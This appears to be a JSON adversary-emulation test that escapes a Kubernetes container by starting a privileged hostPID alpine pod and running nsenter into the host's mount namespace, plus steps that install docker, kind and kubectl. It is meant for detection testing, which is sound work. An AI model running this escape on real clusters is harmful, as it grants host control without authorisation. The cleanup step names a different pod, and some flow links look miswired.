{
  "id": "0b2f9520-a17a-4671-9dba-3bd034099fff",
  "name": "Deploy container using nsenter container escape",
  "description": "In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.\n\nAdditional Details:\n- https://twitter.com/mauilion/status/1129468485480751104\n- https://securekubernetes.com/scenario_2_attack/\n",
  "platforms": [
    "containers"
  ],
  "steps": [
    {
      "id": "853fb33b-de67-4510-8c97-b86f0d684d8a",
      "type": "execute-command",
      "data": {
        "command": "kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"securityContext\":{\"privileged\":true}}]}}'",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "980487be-4ad7-4f84-a16e-9a250e468477",
      "type": "execute-command",
      "data": {
        "command": "kubectl --context kind-atomic-cluster delete pod atomic-escape-pod",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "08095f55-7e2c-4c07-b6c5-0375d627b987",
      "name": "Check dependency 1/5",
      "description": "Verify docker is installed.",
      "type": "execute-command",
      "data": {
        "command": "which docker",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "f3de5a00-f98e-40d0-8f5c-b35c20c64362",
      "name": "Resolve dependency 1/5",
      "description": "Verify docker is installed.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "51724b8f-4376-4e01-83d0-e506f29541f6",
      "name": "Re-check dependency 1/5",
      "description": "Verify docker is installed.",
      "type": "execute-command",
      "data": {
        "command": "which docker",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "0b57f4a7-f9f2-4542-b71f-1a9f04d3831e",
      "name": "Check dependency 2/5",
      "description": "Verify docker service is running.",
      "type": "execute-command",
      "data": {
        "command": "sudo systemctl status docker",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "321de777-825f-4bc9-a57e-2606400f3a72",
      "name": "Resolve dependency 2/5",
      "description": "Verify docker service is running.",
      "type": "execute-command",
      "data": {
        "command": "sudo systemctl start docker",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "cbface6b-1ae5-4d48-8c94-62ee89f7f0e5",
      "name": "Re-check dependency 2/5",
      "description": "Verify docker service is running.",
      "type": "execute-command",
      "data": {
        "command": "sudo systemctl status docker",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "f3ce0164-e507-4f5e-8f9b-dfe969c5b5a7",
      "name": "Check dependency 3/5",
      "description": "Verify kind is in the path.",
      "type": "execute-command",
      "data": {
        "command": "which kind",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "c6bc0319-1bf5-401c-84e2-5fec9565d3bd",
      "name": "Resolve dependency 3/5",
      "description": "Verify kind is in the path.",
      "type": "execute-command",
      "data": {
        "command": "curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64\nchmod +x ./kind\nmv kind /usr/bin/kind",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "96e89474-48ce-415f-a5ac-bd74a8d1dd7a",
      "name": "Re-check dependency 3/5",
      "description": "Verify kind is in the path.",
      "type": "execute-command",
      "data": {
        "command": "which kind",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "6ccc0cb5-3a0e-4e9a-b10b-c42509800eee",
      "name": "Check dependency 4/5",
      "description": "Verify kind-atomic-cluster is created",
      "type": "execute-command",
      "data": {
        "command": "sudo kind get clusters",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "5fb2282a-0960-4034-917d-4e9b16174d3b",
      "name": "Resolve dependency 4/5",
      "description": "Verify kind-atomic-cluster is created",
      "type": "execute-command",
      "data": {
        "command": "sudo kind create cluster --name atomic-cluster",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "ba928f42-9c3f-4af5-929f-a2f0bc821899",
      "name": "Re-check dependency 4/5",
      "description": "Verify kind-atomic-cluster is created",
      "type": "execute-command",
      "data": {
        "command": "sudo kind get clusters",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "2d959bfb-3073-48e0-a09e-9f1601530d86",
      "name": "Check dependency 5/5",
      "description": "Verify kubectl is in path",
      "type": "execute-command",
      "data": {
        "command": "which kubectl",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "94dc58f4-731e-40d1-8305-060542bd8357",
      "name": "Resolve dependency 5/5",
      "description": "Verify kubectl is in path",
      "type": "execute-command",
      "data": {
        "command": "curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nchmod +x ./kubectl\nmv kubectl /usr/bin/kubectl",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "9c2000c6-ec45-483f-b3e7-84a7438586a5",
      "name": "Re-check dependency 5/5",
      "description": "Verify kubectl is in path",
      "type": "execute-command",
      "data": {
        "command": "which kubectl",
        "command_type": "sh"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "853fb33b-de67-4510-8c97-b86f0d684d8a",
      "p": "on-success",
      "o": "980487be-4ad7-4f84-a16e-9a250e468477"
    },
    {
      "s": "853fb33b-de67-4510-8c97-b86f0d684d8a",
      "p": "on-failure",
      "o": "980487be-4ad7-4f84-a16e-9a250e468477"
    },
    {
      "s": "08095f55-7e2c-4c07-b6c5-0375d627b987",
      "p": "on-success",
      "o": "853fb33b-de67-4510-8c97-b86f0d684d8a"
    },
    {
      "s": "08095f55-7e2c-4c07-b6c5-0375d627b987",
      "p": "on-failure",
      "o": "f3de5a00-f98e-40d0-8f5c-b35c20c64362"
    },
    {
      "s": "f3de5a00-f98e-40d0-8f5c-b35c20c64362",
      "p": "on-success",
      "o": "51724b8f-4376-4e01-83d0-e506f29541f6"
    },
    {
      "s": "51724b8f-4376-4e01-83d0-e506f29541f6",
      "p": "on-failure",
      "o": "853fb33b-de67-4510-8c97-b86f0d684d8a"
    },
    {
      "s": "0b57f4a7-f9f2-4542-b71f-1a9f04d3831e",
      "p": "on-success",
      "o": "853fb33b-de67-4510-8c97-b86f0d684d8a"
    },
    {
      "s": "0b57f4a7-f9f2-4542-b71f-1a9f04d3831e",
      "p": "on-failure",
      "o": "321de777-825f-4bc9-a57e-2606400f3a72"
    },
    {
      "s": "321de777-825f-4bc9-a57e-2606400f3a72",
      "p": "on-success",
      "o": "cbface6b-1ae5-4d48-8c94-62ee89f7f0e5"
    },
    {
      "s": "cbface6b-1ae5-4d48-8c94-62ee89f7f0e5",
      "p": "on-failure",
      "o": "853fb33b-de67-4510-8c97-b86f0d684d8a"
    },
    {
      "s": "f3ce0164-e507-4f5e-8f9b-dfe969c5b5a7",
      "p": "on-success",
      "o": "853fb33b-de67-4510-8c97-b86f0d684d8a"
    },
    {
      "s": "f3ce0164-e507-4f5e-8f9b-dfe969c5b5a7",
      "p": "on-failure",
      "o": "c6bc0319-1bf5-401c-84e2-5fec9565d3bd"
    },
    {
      "s": "c6bc0319-1bf5-401c-84e2-5fec9565d3bd",
      "p": "on-success",
      "o": "96e89474-48ce-415f-a5ac-bd74a8d1dd7a"
    },
    {
      "s": "96e89474-48ce-415f-a5ac-bd74a8d1dd7a",
      "p": "on-failure",
      "o": "853fb33b-de67-4510-8c97-b86f0d684d8a"
    },
    {
      "s": "6ccc0cb5-3a0e-4e9a-b10b-c42509800eee",
      "p": "on-success",
      "o": "853fb33b-de67-4510-8c97-b86f0d684d8a"
    },
    {
      "s": "6ccc0cb5-3a0e-4e9a-b10b-c42509800eee",
      "p": "on-failure",
      "o": "5fb2282a-0960-4034-917d-4e9b16174d3b"
    },
    {
      "s": "5fb2282a-0960-4034-917d-4e9b16174d3b",
      "p": "on-success",
      "o": "ba928f42-9c3f-4af5-929f-a2f0bc821899"
    },
    {
      "s": "ba928f42-9c3f-4af5-929f-a2f0bc821899",
      "p": "on-failure",
      "o": "853fb33b-de67-4510-8c97-b86f0d684d8a"
    },
    {
      "s": "2d959bfb-3073-48e0-a09e-9f1601530d86",
      "p": "on-success",
      "o": "853fb33b-de67-4510-8c97-b86f0d684d8a"
    },
    {
      "s": "2d959bfb-3073-48e0-a09e-9f1601530d86",
      "p": "on-failure",
      "o": "94dc58f4-731e-40d1-8305-060542bd8357"
    },
    {
      "s": "94dc58f4-731e-40d1-8305-060542bd8357",
      "p": "on-success",
      "o": "9c2000c6-ec45-483f-b3e7-84a7438586a5"
    },
    {
      "s": "9c2000c6-ec45-483f-b3e7-84a7438586a5",
      "p": "on-failure",
      "o": "853fb33b-de67-4510-8c97-b86f0d684d8a"
    }
  ],
  "tags": [
    "T1611"
  ],
  "input_arguments": null
}